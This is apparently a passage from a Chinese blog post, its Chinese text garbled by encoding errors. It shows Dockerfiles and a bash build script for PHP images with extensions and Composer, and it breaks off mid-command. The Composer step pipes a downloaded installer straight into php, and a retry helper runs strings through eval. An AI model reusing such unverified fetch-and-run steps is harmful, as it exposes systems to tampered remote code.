<h5 data-id="heading-16">Dockerfile.base</h5>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># =============================================================================
# PHP åŸºç¡€é•œåƒ Dockerfile
# åŠŸèƒ½ï¼šå®‰è£…ç³»ç»Ÿä¾èµ–ã€ç¼–è¯‘å·¥å…·å’Œå¸¸ç”¨åº“ï¼Œä¸ºåç»­æ‰©å±•å®‰è£…åšå‡†å¤‡
# =============================================================================

# æ„å»ºå‚æ•°
ARG BASE_IMAGE
FROM ${BASE_IMAGE}

# ç³»ç»Ÿç±»å‹å‚æ•°
ARG SYSTEM_TYPE
ARG CUSTOM_SOURCE

# è®¾ç½®å·¥ä½œç›®å½•
WORKDIR /tmp/build

# è®¾ç½®ç¯å¢ƒå˜é‡é˜²æ­¢ OOM
ENV MAKEFLAGS="-j2"
ENV COMPOSER_MEMORY_LIMIT=-1

# å¤åˆ¶æºé…ç½®æ–‡ä»¶
COPY source/${SYSTEM_TYPE}_source.list /tmp/source.list

# å®‰è£…åŸºç¡€ä¾èµ–å’Œç¼–è¯‘å·¥å…·
RUN set -eux; \
    echo "========================================"; \
    echo "å¼€å§‹æ„å»º PHP åŸºç¡€é•œåƒ"; \
    echo "ç³»ç»Ÿç±»å‹: ${SYSTEM_TYPE}"; \
    echo "è‡ªå®šä¹‰æº: ${CUSTOM_SOURCE}"; \
    echo "========================================"; \
    \
    # Alpine ç³»ç»Ÿé…ç½®
    if [ "$SYSTEM_TYPE" = "alpine" ]; then \
        echo "é…ç½® Alpine æº..."; \
        if [ "$CUSTOM_SOURCE" = "true" ]; then \
            echo "ä½¿ç”¨è‡ªå®šä¹‰æº"; \
            cat /tmp/source.list &gt; /etc/apk/repositories; \
        fi; \
        \
        echo "æ›´æ–°è½¯ä»¶åŒ…ç´¢å¼•..."; \
        apk update || { echo "APK æ›´æ–°å¤±è´¥"; exit 1; }; \
        \
        echo "å®‰è£…åŸºç¡€å·¥å…·..."; \
        apk add --no-cache \
            bash \
            curl \
            wget \
            git \
            vim \
            unzip || { echo "åŸºç¡€å·¥å…·å®‰è£…å¤±è´¥"; exit 1; }; \
        \
        echo "å®‰è£…å¼€å‘åº“..."; \
        apk add --no-cache \
            libzip-dev \
            zlib-dev \
            libpng-dev \
            libjpeg-turbo-dev \
            freetype-dev \
            libwebp-dev || { echo "å¼€å‘åº“å®‰è£…å¤±è´¥"; exit 1; }; \
        \
        echo "å®‰è£… XPM å’ŒåŠ å¯†åº“..."; \
        apk add --no-cache \
            libxpm-dev \
            openssl-dev \
            curl-dev || { echo "XPM/åŠ å¯†åº“å®‰è£…å¤±è´¥"; exit 1; }; \
        \
        echo "å®‰è£… XML å’Œæ•°æ®åº“åº“..."; \
        apk add --no-cache \
            libxml2-dev \
            oniguruma-dev \
            sqlite-dev \
            postgresql-dev || { echo "XML/æ•°æ®åº“åº“å®‰è£…å¤±è´¥"; exit 1; }; \
        \
        echo "å®‰è£…ç¼–è¯‘å·¥å…·..."; \
        apk add --no-cache \
            autoconf \
            g++ \
            make \
            linux-headers || { echo "ç¼–è¯‘å·¥å…·å®‰è£…å¤±è´¥"; exit 1; }; \
        \
        echo "é…ç½® GD æ‰©å±•ä¾èµ–..."; \
        docker-php-ext-configure gd \
            --with-freetype \
            --with-jpeg \
            --with-webp || { echo "GD é…ç½®å¤±è´¥ï¼Œç»§ç»­..."; }; \
    \
    # Debian ç³»ç»Ÿé…ç½®
    else \
        echo "é…ç½® Debian æº..."; \
        if [ "$CUSTOM_SOURCE" = "true" ]; then \
            echo "ä½¿ç”¨è‡ªå®šä¹‰æº"; \
            cat /tmp/source.list &gt; /etc/apt/sources.list; \
        fi; \
        \
        echo "æ›´æ–°è½¯ä»¶åŒ…ç´¢å¼•..."; \
        apt-get update || { echo "APT æ›´æ–°å¤±è´¥"; exit 1; }; \
        \
        echo "å®‰è£…åŸºç¡€å·¥å…·å’Œç¼–è¯‘ä¾èµ–..."; \
        DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
            curl \
            wget \
            git \
            vim \
            unzip \
            libzip-dev \
            zlib1g-dev \
            libpng-dev \
            libjpeg-dev \
            libfreetype6-dev \
            libwebp-dev \
            libxpm-dev \
            libssl-dev \
            libcurl4-openssl-dev \
            libxml2-dev \
            libonig-dev \
            libsqlite3-dev \
            libpq-dev \
            autoconf \
            g++ \
            make || { echo "Debian åŒ…å®‰è£…å¤±è´¥"; exit 1; }; \
        \
        echo "é…ç½® GD æ‰©å±•ä¾èµ–..."; \
        docker-php-ext-configure gd \
            --with-freetype \
            --with-jpeg \
            --with-webp || { echo "GD é…ç½®å¤±è´¥ï¼Œç»§ç»­..."; }; \
        \
        echo "æ¸…ç† APT ç¼“å­˜..."; \
        rm -rf /var/lib/apt/lists/*; \
    fi; \
    \
    # æ¸…ç†ä¸´æ—¶æ–‡ä»¶
    rm -rf /tmp/*; \
    \
    echo "========================================"; \
    echo "åŸºç¡€é•œåƒæ„å»ºå®Œæˆ"; \
    echo "========================================";

# å¥åº·æ£€æŸ¥
RUN php -v &amp;&amp; php -m

# è®¾ç½®é»˜è®¤å·¥ä½œç›®å½•
WORKDIR /var/www/html

</code></pre>
<ul>
<li>
<p>è¯¥æ–‡ä»¶æ³¨é‡Šå·²æ ‡æ³¨åœ¨æ–‡æ¡£ä¸­</p>
</li>
<li>
<p>ç®€è¦è¯´æ˜</p>
<ul>
<li>æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œä¼šç”Ÿæˆç±»ä¼¼äº php-base:8.2-debian php-base:8.2-alpine çš„åŸºç¡€é•œåƒ</li>
<li>åŸºç¡€é•œåƒçš„ç”Ÿæˆè§„åˆ™
<ul>
<li>
<p>é•œåƒåç§°è§„åˆ™ï¼šå›ºå®šå€¼ php-base</p>
</li>
<li>
<p>tag æ ‡ç­¾ç”Ÿæˆè§„åˆ™ï¼šè‡ªåŠ¨è¯»å–é…ç½®æ–‡ä»¶ä¸­çš„ åŸºç¡€é•œåƒåï¼Œè·å–ç‰ˆæœ¬å· å’Œ å¯¹åº”çš„ç³»ç»Ÿä¿¡æ¯ï¼ˆdebian/alpineï¼‰ä½œä¸º tag åç§°</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 data-id="heading-17">Dockerfile.final</h5>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># =============================================================================
# PHP æœ€ç»ˆé•œåƒ Dockerfileï¼ˆå¤šé˜¶æ®µæ„å»ºï¼‰
# åŠŸèƒ½ï¼šåŸºäºåŸºç¡€é•œåƒå®‰è£… PHP æ‰©å±•ã€é…ç½® PHP å’Œ Composer
# =============================================================================

# æ„å»ºå‚æ•°
ARG BASE_IMAGE_NAME
FROM ${BASE_IMAGE_NAME}

# æ‰©å±•å’Œé…ç½®å‚æ•°
ARG SYSTEM_TYPE
ARG PECL_EXTENSIONS=""
ARG LOCAL_EXTENSIONS=""
ARG PHP_INI_CONFIGS=""
ARG COMPOSER_MIRROR="auto"
ARG BUILD_MODE="dev"

# è®¾ç½®å·¥ä½œç›®å½•
WORKDIR /tmp/build

# å¤åˆ¶æœ¬åœ°æ‰©å±•ç›®å½•ï¼ˆå¦‚æœå­˜åœ¨ï¼‰
COPY pecl/ /tmp/pecl/

# å®‰è£… PHP æ‰©å±•
RUN set -eux; \
    echo "========================================"; \
    echo "å¼€å§‹å®‰è£… PHP æ‰©å±•"; \
    echo "ç³»ç»Ÿç±»å‹: ${SYSTEM_TYPE}"; \
    echo "PECL æ‰©å±•: ${PECL_EXTENSIONS}"; \
    echo "LOCAL æ‰©å±•: ${LOCAL_EXTENSIONS}"; \
    echo "æ„å»ºæ¨¡å¼: ${BUILD_MODE}"; \
    echo "========================================"; \
    \
    # å®šä¹‰é‡è¯•å‡½æ•°
    retry_command() { \
        local max_attempts=3; \
        local attempt=1; \
        local cmd="$@"; \
        while [ $attempt -le $max_attempts ]; do \
            echo "å°è¯•æ‰§è¡Œ (${attempt}/${max_attempts}): ${cmd}"; \
            if eval "$cmd"; then \
                echo "æ‰§è¡ŒæˆåŠŸ"; \
                return 0; \
            fi; \
            echo "æ‰§è¡Œå¤±è´¥ï¼Œç­‰å¾… 5 ç§’åé‡è¯•..."; \
            sleep 5; \
            attempt=$((attempt + 1)); \
        done; \
        echo "æ‰§è¡Œå¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°"; \
        return 1; \
    }; \
    \
    # å®‰è£… LOCAL æ‰©å±•
    if [ -n "$LOCAL_EXTENSIONS" ]; then \
        echo "----------------------------------------"; \
        echo "å®‰è£… LOCAL æ‰©å±•: $LOCAL_EXTENSIONS"; \
        echo "----------------------------------------"; \
        \
        # ç‰¹æ®Šæ‰©å±•ä¾èµ–å¤„ç†
        for ext in $LOCAL_EXTENSIONS; do \
            case "$ext" in \
                gd) \
                    echo "æ£€æµ‹åˆ° GD æ‰©å±•ï¼Œå·²åœ¨åŸºç¡€é•œåƒé…ç½®"; \
                    ;; \
                zip) \
                    echo "æ£€æµ‹åˆ° ZIP æ‰©å±•"; \
                    if [ "$SYSTEM_TYPE" = "alpine" ]; then \
                        apk add --no-cache libzip-dev; \
                    fi; \
                    ;; \
                pdo_mysql) \
                    echo "æ£€æµ‹åˆ° PDO_MYSQL æ‰©å±•"; \
                    ;; \
                opcache) \
                    echo "æ£€æµ‹åˆ° OPCACHE æ‰©å±•"; \
                    ;; \
                pcntl) \
                    echo "æ£€æµ‹åˆ° PCNTL æ‰©å±•"; \
                    ;; \
                *) \
                    echo "æ‰©å±•: $ext"; \
                    ;; \
            esac; \
        done; \
        \
        # ä¸€æ¬¡æ€§å®‰è£…æ‰€æœ‰ LOCAL æ‰©å±•
        if ! retry_command "docker-php-ext-install -j\$(nproc) $LOCAL_EXTENSIONS"; then \
            echo "LOCAL æ‰©å±•å®‰è£…å¤±è´¥"; \
            exit 1; \
        fi; \
        echo "LOCAL æ‰©å±•å®‰è£…æˆåŠŸ"; \
    fi; \
    \
    # å®‰è£… PECL æ‰©å±•
    if [ -n "$PECL_EXTENSIONS" ]; then \
        echo "----------------------------------------"; \
        echo "å®‰è£… PECL æ‰©å±•: $PECL_EXTENSIONS"; \
        echo "----------------------------------------"; \
        \
        echo "$PECL_EXTENSIONS" | tr ',' '\n' | while read -r ext; do \
            # è·³è¿‡ç©ºè¡Œ
            [ -z "$ext" ] &amp;&amp; continue; \
            \
            ext_name=$(echo "$ext" | cut -d'-' -f1); \
            echo "å¤„ç†æ‰©å±•: $ext_name (å®Œæ•´åç§°: $ext)"; \
            \
            # æ£€æŸ¥æœ¬åœ°æ‰©å±•ç›®å½•
            if [ -f "/tmp/pecl/${ext}.tgz" ]; then \
                echo "ä»æœ¬åœ°å®‰è£…: ${ext}"; \
                if ! retry_command "pecl install /tmp/pecl/${ext}.tgz"; then \
                    echo "ä»æœ¬åœ°å®‰è£…å¤±è´¥ï¼Œå°è¯•ä» PECL ä»“åº“å®‰è£…"; \
                    if ! retry_command "pecl install $ext"; then \
                        echo "æ‰©å±• $ext å®‰è£…å¤±è´¥"; \
                        exit 1; \
                    fi; \
                fi; \
            else \
                echo "ä» PECL ä»“åº“å®‰è£…: ${ext}"; \
                if ! retry_command "pecl install $ext"; then \
                    echo "æ‰©å±• $ext å®‰è£…å¤±è´¥"; \
                    exit 1; \
                fi; \
            fi; \
            \
            # å¯ç”¨æ‰©å±•
            echo "å¯ç”¨æ‰©å±•: $ext_name"; \
            docker-php-ext-enable "$ext_name"; \
        done; \
        echo "PECL æ‰©å±•å®‰è£…æˆåŠŸ"; \
    fi; \
    \
    # éªŒè¯æ‰©å±•å®‰è£…
    echo "----------------------------------------"; \
    echo "éªŒè¯å·²å®‰è£…çš„æ‰©å±•:"; \
    php -m; \
    echo "----------------------------------------";

# é…ç½® PHP.ini
RUN set -eux; \
    if [ -n "$PHP_INI_CONFIGS" ]; then \
        echo "========================================"; \
        echo "é…ç½® PHP.ini"; \
        echo "========================================"; \
        \
        echo "$PHP_INI_CONFIGS" | tr '|' '\n' | while read -r config; do \
            # è·³è¿‡ç©ºè¡Œ
            [ -z "$config" ] &amp;&amp; continue; \
            \
            echo "è®¾ç½®é…ç½®: $config"; \
            echo "$config" &gt;&gt; /usr/local/etc/php/conf.d/custom.ini; \
        done; \
        \
        echo "PHP.ini é…ç½®å®Œæˆ"; \
        cat /usr/local/etc/php/conf.d/custom.ini; \
    fi;

# å®‰è£… Composer
RUN set -eux; \
    echo "========================================"; \
    echo "å®‰è£… Composer"; \
    echo "Composer é•œåƒ: ${COMPOSER_MIRROR}"; \
    echo "========================================"; \
    \
    # ä¸‹è½½ Composer
    curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer; \
    \
    # é…ç½® Composer é•œåƒæº
    case "$COMPOSER_MIRROR" in \
        aliyun) \
            echo "é…ç½®é˜¿é‡Œäº‘ Composer é•œåƒ"; \
            composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/; \
            ;; \
        tencent) \
            echo "é…ç½®è…¾è®¯äº‘ Composer é•œåƒ"; \
            composer config -g repo.packagist composer https://mirrors.cloud.tencent.com/composer/; \
            ;; \
        ustc) \
            echo "é…ç½®ä¸­ç§‘å¤§ Composer é•œåƒ"; \
            composer config -g repo.packagist composer https://packagist.mirrors.ustc.edu.cn/; \
            ;; \
        packagist) \
            echo "ä½¿ç”¨å®˜æ–¹ Packagist æº"; \
            ;; \
        auto) \
            echo "è‡ªåŠ¨æ£€æµ‹ï¼Œä½¿ç”¨é˜¿é‡Œäº‘é•œåƒ"; \
            composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/; \
            ;; \
        *) \
            echo "æœªçŸ¥çš„ Composer é•œåƒé…ç½®ï¼Œä½¿ç”¨é»˜è®¤æº"; \
            ;; \
    esac; \
    \
    # éªŒè¯ Composer
    composer --version; \
    echo "Composer å®‰è£…å®Œæˆ";

# æ¸…ç†å’Œä¼˜åŒ–
RUN set -eux; \
    echo "========================================"; \
    echo "æ¸…ç†ä¸´æ—¶æ–‡ä»¶å’Œä¼˜åŒ–é•œåƒ"; \
    echo "æ„å»ºæ¨¡å¼: ${BUILD_MODE}"; \
    echo "========================================"; \
    \
    # æ¸…ç† PECL ç¼“å­˜
    rm -rf /tmp/pear; \
    \
    # æ¸…ç†æœ¬åœ°æ‰©å±•
    rm -rf /tmp/pecl; \
    \
    # æ ¹æ®æ„å»ºæ¨¡å¼å†³å®šæ˜¯å¦æ¸…ç†ç¼–è¯‘å·¥å…·
    if [ "$BUILD_MODE" = "prod" ]; then \
        echo "ç”Ÿäº§æ¨¡å¼ï¼šæ¸…ç†ç¼–è¯‘å·¥å…·ä»¥ä¼˜åŒ–é•œåƒå¤§å°"; \
        if [ "$SYSTEM_TYPE" = "alpine" ]; then \
            apk del autoconf g++ make linux-headers; \
        else \
            apt-get purge -y autoconf g++ make; \
            apt-get autoremove -y; \
            rm -rf /var/lib/apt/lists/*; \
        fi; \
    else \
        echo "å¼€å‘æ¨¡å¼ï¼šä¿ç•™ç¼–è¯‘å·¥å…·"; \
    fi; \
    \
    # æ¸…ç†ä¸´æ—¶æ–‡ä»¶
    rm -rf /tmp/*; \
    rm -rf /var/tmp/*; \
    \
    echo "æ¸…ç†å®Œæˆ";

# æœ€ç»ˆéªŒè¯
RUN set -eux; \
    echo "========================================"; \
    echo "æœ€ç»ˆéªŒè¯"; \
    echo "========================================"; \
    echo "PHP ç‰ˆæœ¬:"; \
    php -v; \
    echo ""; \
    echo "å·²å®‰è£…çš„æ‰©å±•:"; \
    php -m; \
    echo ""; \
    echo "Composer ç‰ˆæœ¬:"; \
    composer --version; \
    echo "========================================"; \
    echo "é•œåƒæ„å»ºå®Œæˆï¼"; \
    echo "========================================";

# è®¾ç½®å·¥ä½œç›®å½•
WORKDIR /opt/www

</code></pre>
<ul>
<li>è¯¥æ–‡ä»¶æ³¨é‡Šå·²æ ‡æ³¨åœ¨æ–‡æ¡£ä¸­</li>
<li>ç®€è¦è¯´æ˜
<ul>
<li>æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œä¼šç”Ÿæˆä½ æŒ‡å®šçš„é•œåƒåç§°å’Œ tag æ ‡ç­¾
<ul>
<li>ä½¿ç”¨å¤šé˜¶æ®µæ„å»ºæ¨¡å¼ï¼Œ<strong>ç¬¬ä¸€é˜¶æ®µï¼š</strong> å®‰è£… pecl å’Œ local æ‰©å±•ï¼›<strong>ç¬¬äºŒé˜¶æ®µï¼š</strong> æ„å»ºæœ€ç»ˆé•œåƒ</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 data-id="heading-18">build.sh</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># =============================================================================</span>
<span class="hljs-comment"># PHP Docker å¤šé˜¶æ®µæ„å»ºè„šæœ¬</span>
<span class="hljs-comment"># åŠŸèƒ½ï¼šæ ¹æ®é…ç½®æ–‡ä»¶è‡ªåŠ¨æ„å»º PHP åŸºç¡€é•œåƒå’Œæœ€ç»ˆé•œåƒ</span>
<span class="hljs-comment"># ç”¨æ³•ï¼š./build.sh [æœ€ç»ˆé•œåƒåç§°]</span>
<span class="hljs-comment"># =============================================================================</span>

<span class="hljs-built_in">set</span> -e  <span class="hljs-comment"># é‡åˆ°é”™è¯¯ç«‹å³é€€å‡º</span>

<span class="hljs-comment"># é¢œè‰²å®šä¹‰</span>
RED=<span class="hljs-string">'\033[0;31m'</span>
GREEN=<span class="hljs-string">'\033[0;32m'</span>
YELLOW=<span class="hljs-string">'\033[1;33m'</span>
BLUE=<span class="hljs-string">'\033[0;34m'</span>
NC=<span class="hljs-string">'\033[0m'</span> <span class="hljs-comment"># æ— é¢œè‰²</span>

<span class="hljs-comment"># é…ç½®æ–‡ä»¶è·¯å¾„</span>
CONFIG_FILE=<span class="hljs-string">"./config/build.conf"</span>
SCRIPT_DIR=<span class="hljs-string">"<span class="hljs-subst">$(cd <span class="hljs-string">"<span class="hljs-subst">$(dirname <span class="hljs-string">"<span class="hljs-variable">${BASH_SOURCE[0]}</span>"</span>)</span>"</span> &amp;&amp; pwd)</span>"</span>

<span class="hljs-comment"># æ—¥å¿—å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-title">log_info</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${BLUE}</span>[INFO]<span class="hljs-variable">${NC}</span> <span class="hljs-subst">$(date '+%Y-%m-%d %H:%M:%S')</span> - <span class="hljs-variable">$1</span>"</span>
}

<span class="hljs-function"><span class="hljs-title">log_success</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>[SUCCESS]<span class="hljs-variable">${NC}</span> <span class="hljs-subst">$(date '+%Y-%m-%d %H:%M:%S')</span> - <span class="hljs-variable">$1</span>"</span>
}

<span class="hljs-function"><span class="hljs-title">log_warn</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>[WARN]<span class="hljs-variable">${NC}</span> <span class="hljs-subst">$(date '+%Y-%m-%d %H:%M:%S')</span> - <span class="hljs-variable">$1</span>"</span>
}

<span class="hljs-function"><span class="hljs-title">log_error</span></span>() {
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>[ERROR]<span class="hljs-variable">${NC}</span> <span class="hljs-subst">$(date '+%Y-%m-%d %H:%M:%S')</span> - <span class="hljs-variable">$1</span>"</span>
}

<span class="hljs-comment"># æ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-function"><span class="hljs-title">check_config_file</span></span>() {
    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"<span class="hljs-variable">$CONFIG_FILE</span>"</span> ]; <span class="hljs-keyword">then</span>
        log_error <span class="hljs-string">"é…ç½®æ–‡ä»¶ä¸å­˜åœ¨: <span class="hljs-variable">$CONFIG_FILE</span>"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
    log_info <span class="hljs-string">"é…ç½®æ–‡ä»¶æ£€æŸ¥é€šè¿‡"</span>
}

<span class="hljs-comment"># è§£æé…ç½®æ–‡ä»¶</span>
<span class="hljs-function"><span class="hljs-title">parse_config</span></span>() {
    <span class="hljs-built_in">local</span> section=<span class="hljs-string">""</span>
    <span class="hljs-built_in">local</span> key=<span class="hljs-string">""</span>
    
    <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line || [ -n <span class="hljs-string">"<span class="hljs-variable">$line</span>"</span> ]; <span class="hljs-keyword">do</span>
        <span class="hljs-comment"># è·³è¿‡ç©ºè¡Œå’Œæ³¨é‡Š</span>
        [[ -z <span class="hljs-string">"<span class="hljs-variable">$line</span>"</span> || <span class="hljs-string">"<span class="hljs-variable">$line</span>"</span> =~ ^[[:space:]]*<span class="hljs-comment"># ]] &amp;&amp; continue</span>
        
        <span class="hljs-comment"># æ£€æµ‹ section</span>
        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$line</span>"</span> =~ ^\[(.+)\]$ ]]; <span class="hljs-keyword">then</span>
            section=<span class="hljs-string">"<span class="hljs-variable">${BASH_REMATCH[1]}</span>"</span>
            <span class="hljs-built_in">continue</span>
        <span class="hljs-keyword">fi</span>
        
        <span class="hljs-comment"># è¯»å–é…ç½®å€¼</span>
        <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$section</span>"</span> ]; <span class="hljs-keyword">then</span>
            <span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$section</span>"</span> <span class="hljs-keyword">in</span>
                base_image)
                    BASE_IMAGE=<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>
                    ;;
                pecl)
                    PECL_EXTENSIONS+=(<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>)
                    ;;
                <span class="hljs-built_in">local</span>)
                    LOCAL_EXTENSIONS+=(<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>)
                    ;;
                mode)
                    BUILD_MODE=<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>
                    ;;
                custom_source)
                    CUSTOM_SOURCE=<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>
                    ;;
                composer_mirror)
                    COMPOSER_MIRROR=<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>
                    ;;
                php)
                    PHP_INI_CONFIGS+=(<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>)
                    ;;
                build_target)
                    BUILD_TARGET=<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>
                    ;;
                force_rebuild_base)
                    FORCE_REBUILD_BASE=<span class="hljs-string">"<span class="hljs-variable">$line</span>"</span>
                    ;;
            <span class="hljs-keyword">esac</span>
        <span class="hljs-keyword">fi</span>
    <span class="hljs-keyword">done</span> &lt; <span class="hljs-string">"<span class="hljs-variable">$CONFIG_FILE</span>"</span>
}

<span class="hljs-comment"># æ£€æµ‹ç³»ç»Ÿç±»å‹ï¼ˆAlpine æˆ– Debianï¼‰</span>
<span class="hljs-function"><span class="hljs-title">detect_system_type</span></span>() {
    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$BASE_IMAGE</span>"</span> == *<span class="hljs-string">"alpine"</span>* ]]; <span class="hljs-keyword">then</span>
        SYSTEM_TYPE=<span class="hljs-string">"alpine"</span>
    <span class="hljs-keyword">else</span>
        SYSTEM_TYPE=<span class="hljs-string">"debian"</span>
    <span class="hljs-keyword">fi</span>
    log_info <span class="hljs-string">"æ£€æµ‹åˆ°ç³»ç»Ÿç±»å‹: <span class="hljs-variable">$SYSTEM_TYPE</span>"</span>
}

<span class="hljs-comment"># ç”ŸæˆåŸºç¡€é•œåƒåç§°</span>
<span class="hljs-function"><span class="hljs-title">generate_base_image_name</span></span>() {
    <span class="hljs-built_in">local</span> version=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$BASE_IMAGE</span>"</span> | grep -oP <span class="hljs-string">'php:\K[0-9]+\.[0-9]+'</span>)
    BASE_IMAGE_NAME=<span class="hljs-string">"php-base:<span class="hljs-variable">${version}</span>-<span class="hljs-variable">${SYSTEM_TYPE}</span>"</span>
    log_info <span class="hljs-string">"åŸºç¡€é•œåƒåç§°: <span class="hljs-variable">$BASE_IMAGE_NAME</span>"</span>
}

<span class="hljs-comment"># æ£€æŸ¥åŸºç¡€é•œåƒæ˜¯å¦å­˜åœ¨</span>
<span class="hljs-function"><span class="hljs-title">check_base_image_exists</span></span>() {
    <span class="hljs-keyword">if</span> docker image inspect <span class="hljs-string">"<span class="hljs-variable">$BASE_IMAGE_NAME</span>"</span> &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span>
        log_info <span class="hljs-string">"åŸºç¡€é•œåƒå·²å­˜åœ¨: <span class="hljs-variable">$BASE_IMAGE_NAME</span>"</span>
        <span class="hljs-built_in">return</span> 0
    <span class="hljs-keyword">else</span>
        log_info <span class="hljs-string">"åŸºç¡€é•œåƒä¸å­˜åœ¨ï¼Œéœ€è¦æ„å»º"</span>
        <span class="hljs-built_in">return</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># æ„å»ºåŸºç¡€é•œåƒ</span>
<span class="hljs-function"><span class="hljs-title">build_base_image</span></span>() {
    log_info <span class="hljs-string">"å¼€å§‹æ„å»ºåŸºç¡€é•œåƒ..."</span>
    
    <span class="hljs-comment"># æ„å»ºå‚æ•°</span>
    docker build \
        --file Dockerfile.base \
        --build-arg BASE_IMAGE=<span class="hljs-string">"<span class="hljs-variable">$BASE_IMAGE</span>"</span> \
        --build-arg SYSTEM_TYPE=<span class="hljs-string">"<span class="hljs-variable">$SYSTEM_TYPE</span>"</span> \
        --build-arg CUSTOM_SOURCE=<span class="hljs-string">"<span class="hljs-variable">$CUSTOM_SOURCE</span>"</span> \
        --tag <span class="hljs-string">"<span class="hljs-variable">$BASE_IMAGE_NAME</span>"</span> \
        --progress=plain \
        .
    
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        log_success <span class="hljs-string">"åŸºç¡€é•œåƒæ„å»ºæˆåŠŸ: <span class="hljs-variable">$BASE_IMAGE_NAME</span>"</span>
    <span class="hljs-keyword">else</span>
        log_error <span class="hljs-string">"åŸºç¡€é•œåƒæ„å»ºå¤±è´¥"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># æ„å»ºæœ€ç»ˆé•œåƒ</span>
<span class="hljs-function"><span class="hljs-title">build_final_image</span></span>() {
    <span class="hljs-built_in">local</span> final_image_name=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
    
    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$final_image_name</span>"</span> ]; <span class="hljs-keyword">then</span>
        log_error <span class="hljs-string">"è¯·æä¾›æœ€ç»ˆé•œåƒåç§°"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"ç”¨æ³•: ./build.sh [æœ€ç»ˆé•œåƒåç§°]"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
    
    log_info <span class="hljs-string">"å¼€å§‹æ„å»ºæœ€ç»ˆé•œåƒ: <span class="hljs-variable">$final_image_name</span>"</span>
    
    <span class="hljs-comment"># å‡†å¤‡ PECL æ‰©å±•å‚æ•°</span>
    <span class="hljs-built_in">local</span> pecl_extensions_arg=<span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">${#PECL_EXTENSIONS[@]}</span> -gt 0 ]; <span class="hljs-keyword">then</span>
        pecl_extensions_arg=$(IFS=,; <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${PECL_EXTENSIONS[*]}</span>"</span>)
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># å‡†å¤‡ LOCAL æ‰©å±•å‚æ•°</span>
    <span class="hljs-built_in">local</span> local_extensions_arg=<span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">${#LOCAL_EXTENSIONS[@]}</span> -gt 0 ]; <span class="hljs-keyword">then</span>
        local_extensions_arg=$(IFS=<span class="hljs-string">' '</span>; <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${LOCAL_EXTENSIONS[*]}</span>"</span>)
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># å‡†å¤‡ PHP é…ç½®å‚æ•°</span>
    <span class="hljs-built_in">local</span> php_ini_arg=<span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">${#PHP_INI_CONFIGS[@]}</span> -gt 0 ]; <span class="hljs-keyword">then</span>
        php_ini_arg=$(IFS=<span class="hljs-string">'|'</span>; <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${PHP_INI_CONFIGS[*]}</span>"</span>)
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># æ„å»ºæœ€ç»ˆé•œåƒ</span>
    docker build \
        --file Dockerfile.final \
        --build-arg BASE_IMAGE_NAME=<span class="hljs-string">"<span class="hljs-variable">$BASE_IMAGE_NAME</span>"</span> \
        --build-arg SYSTEM_TYPE=<span class="hljs-string">"<span class="hljs-variable">$SYSTEM_TYPE</span>"</span> \
        --build-arg PECL_EXTENSIONS=<span class="hljs-string">"<span class="hljs-variable">$pecl_extensions_arg</span>"</span> \
